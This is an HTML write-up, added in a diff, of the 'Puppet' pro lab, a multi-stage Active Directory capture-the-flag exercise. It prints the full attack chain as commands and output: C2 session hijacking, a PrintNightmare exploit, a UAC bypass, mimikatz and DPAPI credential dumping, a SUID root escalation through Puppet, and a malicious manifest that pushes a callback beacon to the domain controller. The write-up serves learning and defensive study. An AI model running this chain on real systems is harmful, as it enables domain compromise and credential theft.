@@ -1,0 +1,313 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Puppet • ProLabs Writeup</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0b0d15; color: #e0e5f0; font-family: 'Segoe UI', system-ui, sans-serif; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 2rem; }
+        .container { max-width: 1200px; width: 100%; background: rgba(12, 16, 28, 0.9); border: 1px solid rgba(0, 255, 200, 0.15); border-radius: 2rem; padding: 3rem; box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7); }
+        h1 { font-size: 2.5rem; color: #6fffe0; margin-bottom: 1.5rem; }
+        h2 { color: #6fffe0; font-size: 1.8rem; margin: 2rem 0 1rem; border-bottom: 1px solid rgba(0, 255, 200, 0.1); padding-bottom: 0.5rem; }
+        h3 { color: #4a9eff; font-size: 1.3rem; margin: 1.5rem 0 0.8rem; }
+        h4 { color: #e0e5f0; font-size: 1.1rem; margin: 1rem 0 0.5rem; }
+        p { color: #b6c8e0; line-height: 1.8; margin-bottom: 1rem; }
+        code { background: rgba(0, 0, 0, 0.4); padding: 0.2rem 0.6rem; border-radius: 0.3rem; font-family: 'Courier New', monospace; color: #6fffe0; }
+        pre { background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(0, 255, 200, 0.1); border-radius: 1rem; padding: 1.5rem; overflow-x: auto; margin: 1rem 0; }
+        pre code { background: transparent; color: #b6c8e0; font-size: 0.85rem; line-height: 1.6; padding: 0; }
+        .meta-info { display: flex; flex-wrap: wrap; gap: 1rem 2rem; padding: 1rem; background: rgba(0, 0, 0, 0.2); border-radius: 1rem; margin-bottom: 2rem; }
+        .meta-info span { color: #b6c8e0; font-size: 0.95rem; }
+        .meta-info strong { color: #e0e5f0; }
+        .box { background: rgba(0, 255, 200, 0.03); border-left: 3px solid #6fffe0; padding: 1rem 1.5rem; border-radius: 0.5rem; margin: 1rem 0; }
+        .box.success { border-left-color: #00ff88; background: rgba(0, 255, 136, 0.03); }
+        .box.warning { border-left-color: #ffcc00; background: rgba(255, 200, 0, 0.03); }
+        table { width: 100%; border-collapse: collapse; margin: 1rem 0; }
+        table th, table td { padding: 0.8rem 1rem; border: 1px solid rgba(0, 255, 200, 0.1); text-align: left; color: #b6c8e0; }
+        table th { background: rgba(0, 255, 200, 0.05); color: #6fffe0; }
+        ul { color: #b6c8e0; padding-left: 1.5rem; margin: 0.8rem 0; }
+        ul li { margin-bottom: 0.5rem; line-height: 1.6; }
+        .nav-buttons { display: flex; gap: 1rem; margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 255, 200, 0.1); }
+        .nav-buttons a { padding: 0.6rem 1.5rem; border-radius: 0.8rem; text-decoration: none; transition: all 0.3s; }
+        .nav-buttons .back { border: 1px solid rgba(0, 255, 200, 0.15); color: #b6c8e0; }
+        .nav-buttons .back:hover { border-color: #6fffe0; color: #ffffff; }
+        .footer { margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 255, 200, 0.05); text-align: center; color: #b6c8e0; font-size: 0.85rem; opacity: 0.5; }
+        .attack-chain { background: rgba(0, 255, 200, 0.02); border: 1px solid rgba(0, 255, 200, 0.1); border-radius: 1rem; padding: 1.5rem; margin: 1rem 0; font-family: 'Courier New', monospace; font-size: 0.85rem; color: #b6c8e0; line-height: 1.8; overflow-x: auto; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="meta-info">
+        <span><strong>Lab:</strong> Puppet</span>
+        <span><strong>Type:</strong> ProLabs</span>
+        <span><strong>Difficulty:</strong> Advanced</span>
+        <span><strong>Category:</strong> Active Directory / Sliver C2 / Red Team</span>
+        <span><strong>Author:</strong> razzle_mouse</span>
+    </div>
+
+    <h1>🚀 Puppet Pro Lab - Complete Walkthrough</h1>
+
+    <h2>📋 Lab Infrastructure</h2>
+    <table>
+        <tr><th>Machine</th><th>OS</th></tr>
+        <tr><td>PUPPET-PM01</td><td>Linux (Puppet Master)</td></tr>
+        <tr><td>PUPPET-DC01</td><td>Windows (Domain Controller)</td></tr>
+        <tr><td>PUPPET-FILE01</td><td>Windows (File Server)</td></tr>
+    </table>
+
+    <h2>📌 Synopsis</h2>
+    <p>Puppet is a multi-stage Active Directory penetration testing lab that simulates a real-world hybrid environment — Windows file servers, Linux infrastructure automation, and a domain controller — all tied together by Puppet configuration management.</p>
+    <p>The attack chain doesn't require exotic exploits; it's built on five ordinary failures that, when chained together, hand over domain admin credentials:</p>
+    <ul>
+        <li>A C2 framework configured insecurely</li>
+        <li>A privilege escalation vulnerability (PrintNightmare) left unpatched</li>
+        <li>A service account exposed through credential dumping</li>
+        <li>An SSH infrastructure trusted too readily</li>
+        <li>An automation tool pointed at targets without proper isolation</li>
+    </ul>
+
+    <h2>🔍 Attack Surface & Reconnaissance</h2>
+
+    <h3>Target Layout</h3>
+    <p>The engagement fronts a single gateway (<code>10.13.38.33</code> via FTP, <code>172.16.40.200</code> across the internal network):</p>
+    <ul>
+        <li><strong>File01</strong> (<code>172.16.40.50</code>) — Windows file server, Puppet agent, contains initial beacon</li>
+        <li><strong>Puppet Server</strong> (<code>172.16.40.200</code>) — Linux Puppet master, controls File01 and DC01</li>
+        <li><strong>DC01</strong> (<code>172.16.40.5</code>) — Domain controller, final target</li>
+    </ul>
+
+    <h3>Initial Enumeration</h3>
+    <pre><code>rustscan -b 500 -a 10.13.38.33  -- -sC -sV -Pn</code></pre>
+
+    <p>Results:</p>
+    <table>
+        <tr><th>Port</th><th>Service</th><th>Version</th></tr>
+        <tr><td>21/tcp</td><td>FTP</td><td>vsftpd 3.0.5 (anonymous login allowed)</td></tr>
+        <tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 8.9p1 Ubuntu</td></tr>
+        <tr><td>8140/tcp</td><td>SSL/HTTP</td><td>WEBrick httpd 1.7.0</td></tr>
+        <tr><td>8443/tcp</td><td>SSL/HTTPS</td><td>Sliver C2 server</td></tr>
+        <tr><td>31337/tcp</td><td>SSL/Elite</td><td>C2 port</td></tr>
+    </table>
+
+    <h3>FTP Discovery</h3>
+    <p>Anonymous FTP access revealed two critical files:</p>
+    <pre><code>ftp 10.13.38.33
+# Anonymous login successful
+# Files found: red_127.0.0.1.cfg, sliver-client_linux
+
+ftp> mget red_127.0.0.1.cfg sliver-client_linux</code></pre>
+
+    <p>The configuration file contained hardcoded <code>localhost:31337</code>, indicating the C2 server was not internet-facing — a significant operational security issue.</p>
+
+    <h2>🏁 Flag 1: Sleep — Initial Access via C2</h2>
+
+    <h3>Step 1: Set up socat relay</h3>
+    <pre><code>sudo socat TCP-LISTEN:31337,reuseaddr,fork TCP:10.13.38.33:31337</code></pre>
+
+    <h3>Step 2: Import configuration and connect to Sliver</h3>
+    <pre><code>./sliver-client_linux import ./red_127.0.0.1.cfg</code></pre>
+
+    <h3>Step 3: Interact with existing beacon</h3>
+    <pre><code>beacons
+use &lt;Beacon_ID&gt;
+interactive
+session
+use &lt;Session_ID&gt;</code></pre>
+
+    <h3>Step 4: AD Enumeration with SharpHound</h3>
+    <pre><code>cd c:\\temp
+sharp-hound-4 -s -t 300 -- -c all,gpolocalgroup
+download 20241017043355_BloodHound.zip</code></pre>
+
+    <h3>Step 5: ADCS Enumeration</h3>
+    <pre><code>sa-adcs-enum
+# [*] Found 0 CAs in the domain</code></pre>
+
+    <h3>Step 6: Internal Network Ports</h3>
+    <pre><code>sa-netstat
+# TCP  10.13.38.33:50522    172.16.40.50:8443     ESTABLISHED
+# UDP  127.0.0.1:52613        *:*                 C:\ProgramData\Puppet\puppet-update.exe</code></pre>
+
+    <h3>Step 7: Retrieve the flag</h3>
+    <pre><code>execute -o -- cmd.exe /c dir "C:\Users\Bruce.Smith\Desktop"
+execute -o -- cmd.exe /c type "C:\Users\Bruce.Smith\Desktop\flag.txt"</code></pre>
+
+    <div class="box success">
+        <pre><code>PUPPET{1c1740d66f7071xxxxxxxxxxxxxxxxxxxx}</code></pre>
+    </div>
+
+    <h2>🏁 Flag 2: Nightmare — PrintNightmare LPE</h2>
+
+    <h3>Vulnerability Assessment</h3>
+    <pre><code>sharpsh -t 300 -- -c invoke-privesccheck -u c:\\temp\\PrivescCheck.ps1</code></pre>
+
+    <div class="box warning">
+        <pre><code>Policy: Limits print driver installation to Administrators
+  Value: RestrictDriverInstallationToAdministrators = 0
+  Status: Vulnerable — High Severity
+
+Policy: Point and Print > NoWarningNoElevationOnInstall = 1
+  Description: This reintroduces PrintNightmare (CVE-2021-34527)</code></pre>
+    </div>
+
+    <h3>Exploit: PrintNightmare (CVE-2021-1675)</h3>
+    <pre><code>upload /path/to/CVE-2021-1675.ps1 c:\users\public\CVE-2021-1675.ps1
+
+execute -o -- powershell.exe -ExecutionPolicy Bypass -NoProfile -Command ". c:\temp\CVE-2021-34527.ps1; Invoke-Nightmare -NewUser adm1n -NewPassword P@ssw0rd"
+
+[+] created payload at C:\Users\bruce.smith\AppData\Local\Temp\nightmare.dll
+[+] added user adm1n as local administrator
+[+] deleting payload</code></pre>
+
+    <h3>UAC Bypass to SYSTEM</h3>
+    <pre><code>cd ~/.sliver-client/extensions/UAC-BOF-Bonanza/SspiUacBypass
+make
+
+upload /home/kali/.sliver-client/extensions/UAC-BOF-Bonanza/SspiUacBypass/bin/standalone/SspiUacBypass.exe "c:\temp\SspiUacBypass.exe"
+
+execute -o -- "c:\temp\SspiUacBypass.exe" "c:\programdata\puppet\puppet-update.exe"</code></pre>
+
+    <div class="box success">
+        <pre><code>SYSTEM beacon (NT AUTHORITY\SYSTEM)</code></pre>
+    </div>
+
+    <h3>Credential Dumping</h3>
+    <pre><code>mimikatz privilege::debug sekurlsa::logonpasswords exit</code></pre>
+
+    <div class="box success">
+        <pre><code>Credentials Extracted:
+- svc_puppet_win_t1 — NTLM: 784c7b5105....
+- bruce.smith — NTLM: adca4e5100da.....
+- FILE01$ (machine account) — NTLM: f7a69c8..........</code></pre>
+    </div>
+
+    <div class="box success">
+        <pre><code>PUPPET{3b3072985cxxxxxxxxxxxxxxxxxxxxxxx}</code></pre>
+    </div>
+
+    <h2>🏁 Flag 3: Dance — Lateral Movement</h2>
+
+    <h3>Migrate to Service Process</h3>
+    <pre><code>ps
+# PID 1196 — ruby.exe running as PUPPET\svc_puppet_win_t1
+
+migrate -p 1196</code></pre>
+
+    <h3>Access DC's IT Share</h3>
+    <pre><code>execute -o -- arp -a
+sa-netshares dc01
+
+ls \\\\dc01.puppet.vl\\it
+# .ssh/ (directory), Autologon64.exe, PsExec64.exe
+
+ls \\\\dc01.puppet.vl\\it\\.ssh
+# ed25519 (SSH private key), ed25519.pub</code></pre>
+
+    <h3>Download and Crack SSH Key</h3>
+    <pre><code>download \\\\dc01.puppet.vl\\it\\.ssh\\ed25519
+
+ssh2john ed25519 > ed25519.hash
+john ed25519.hash --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>
+
+    <h3>SSH Access to Puppet Server</h3>
+    <pre><code>portfwd add --bind 2222 -r 172.16.40.200:22
+
+ssh -i ed25519 -p 2222 "svc_puppet_lin_t1@puppet.vl"@127.0.0.1</code></pre>
+
+    <h3>Privilege Escalation on Puppet Server</h3>
+    <pre><code>sudo -l
+# (ALL) NOPASSWD: /usr/bin/puppet
+
+sudo puppet apply -e "exec { '/bin/sh -c \"chmod u+s /bin/bash\"': }"
+bash -p
+# id: uid=451001132(...) euid=0(root)</code></pre>
+
+    <h3>Locate Flag</h3>
+    <pre><code>find / -name "flag.txt" 2>/dev/null
+cat /root/flag.txt</code></pre>
+
+    <div class="box success">
+        <pre><code>PUPPET{c093xxxxxxxxxxxxxxxxxxx}</code></pre>
+    </div>
+
+    <h2>🏁 Flag 4: Puppet Master — DC Compromise</h2>
+
+    <h3>Create Malicious Puppet Manifest</h3>
+    <pre><code>mkdir -p /etc/puppet/code/environments/production/manifests
+
+cat > /etc/puppet/code/environments/production/manifests/site.pp << 'EOF'
+node 'dc01.puppet.vl' {
+  exec { 'pwned':
+    command   => 'C:\\Windows\\System32\\cmd.exe /c \\\\file01.puppet.vl\\files\\update.exe',
+    logoutput => true,
+  }
+}
+node default {
+  notify { 'This is the default node': }
+}
+EOF</code></pre>
+
+    <h3>Generate DC Beacon</h3>
+    <pre><code>generate beacon --mtls 172.16.40.200:8443 --os windows --arch amd64 --save /tmp/update.exe</code></pre>
+
+    <h3>Upload Beacon to File01 Share</h3>
+    <pre><code>upload /tmp/update.exe \\\\file01.puppet.vl\\files\\update.exe</code></pre>
+
+    <h3>DC Agent Check-in</h3>
+    <div class="box success">
+        <pre><code>[*] Beacon c2728189 FORTUNATE_BOSOM - 172.16.40.5:59457 (DC01)</code></pre>
+    </div>
+
+    <h3>Dump DC Credentials with SharpDPAPI</h3>
+    <pre><code>upload /home/kali/tools/SharpCollection/NetFramework_4.7_x64/SharpDPAPI.exe c:\users\public\SharpDPAPI.exe
+
+execute -o -- "c:\users\public\SharpDPAPI.exe" machinetriage</code></pre>
+
+    <div class="box success">
+        <pre><code>Folder: C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials
+
+CredFile: 39FAB9BA3A19E88594B1D50B5E44AAA4
+  TargetName: Domain:batch=TaskScheduler:Task:{ACFD7F3B-51A4-4B11-8428-F287E956EC4C}
+  UserName: PUPPET\root
+  Credential: PUPPET{8b6626xxxxxxxxxxxxxxx}</code></pre>
+    </div>
+
+    <h2>📊 All Flags</h2>
+    <table>
+        <tr><th>#</th><th>Flag</th><th>Vulnerability</th><th>Machine</th></tr>
+        <tr><td>1</td><td><code>PUPPET{1c1740...}</code></td><td>Hardcoded C2 config via anonymous FTP</td><td>PUPPET-FILE01</td></tr>
+        <tr><td>2</td><td><code>PUPPET{3b30...}</code></td><td>PrintNightmare (CVE-2021-1675) LPE</td><td>PUPPET-FILE01</td></tr>
+        <tr><td>3</td><td><code>PUPPET{c09...}</code></td><td>Puppet sudo misconfiguration → root</td><td>PUPPET-PM01</td></tr>
+        <tr><td>4</td><td><code>PUPPET{8b6626...}</code></td><td>Malicious Puppet manifest → DC compromise → DPAPI</td><td>PUPPET-DC01</td></tr>
+    </table>
+
+    <h2>🛠️ Tools Used</h2>
+    <table>
+        <tr><th>Tool</th><th>Purpose</th></tr>
+        <tr><td>Sliver C2</td><td>Command and control framework</td></tr>
+        <tr><td>SharpHound</td><td>Active Directory enumeration</td></tr>
+        <tr><td>PrivescCheck</td><td>Local privilege escalation assessment</td></tr>
+        <tr><td>Mimikatz</td><td>Credential dumping from LSASS</td></tr>
+        <tr><td>SharpDPAPI</td><td>DPAPI credential extraction</td></tr>
+        <tr><td>SspiUacBypass</td><td>UAC bypass</td></tr>
+        <tr><td>socat</td><td>TCP port forwarding</td></tr>
+        <tr><td>ssh2john / john</td><td>SSH key passphrase cracking</td></tr>
+        <tr><td>PrintNightmare (CVE-2021-1675)</td><td>Local privilege escalation</td></tr>
+    </table>
+
+    <h2>🧠 Key Takeaways</h2>
+    <ul>
+        <li><strong>Hardcoded C2 credentials in config files are a liability</strong> — anonymous FTP access combined with a localhost-bound Sliver config handed over the keys to the entire engagement.</li>
+        <li><strong>PrintNightmare is still alive in misconfigured environments</strong> — two registry keys set incorrectly reintroduce a fully patched vulnerability.</li>
+        <li><strong>Service accounts are lateral movement bridges</strong> — migrating into the service process required no new credentials or logon event.</li>
+        <li><strong>Infrastructure automation tools are force-multipliers for attackers</strong> — compromising the master compromises everything it manages.</li>
+        <li><strong>The chain didn't need a single catastrophic bug</strong> — five ordinary failures stacked across trusted components handed over domain admin credentials.</li>
+    </ul>
+
+    <div class="nav-buttons">
+        <a href="/writeups.html" class="back"><i class="fas fa-arrow-left"></i> Back to Writeups</a>
+    </div>
+    <div class="footer">NIGHT PULSE X • 2026</div>
+</div>
+</body>
+</html>
